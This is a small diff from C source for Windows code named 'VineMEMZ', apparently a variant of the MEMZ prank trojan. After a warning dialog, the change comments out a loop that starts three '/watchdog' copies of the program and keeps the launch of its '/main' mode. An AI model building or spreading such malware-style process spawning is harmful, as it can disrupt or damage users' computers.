@@ -81,8 +81,8 @@ STILL EXECUTE IT?", "VineMEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
 			wchar_t *fn = (wchar_t *)LocalAlloc(LMEM_ZEROINIT, 8192 * 2);
 			GetModuleFileName(NULL, fn, 8192);
 
-			for (int i = 0; i < 3; i++)
-				open(fn, L"/watchdog");
+			//for (int i = 0; i < 3; i++)
+			//	open(fn, L"/watchdog");
 
 			open(fn, L"/main");
 
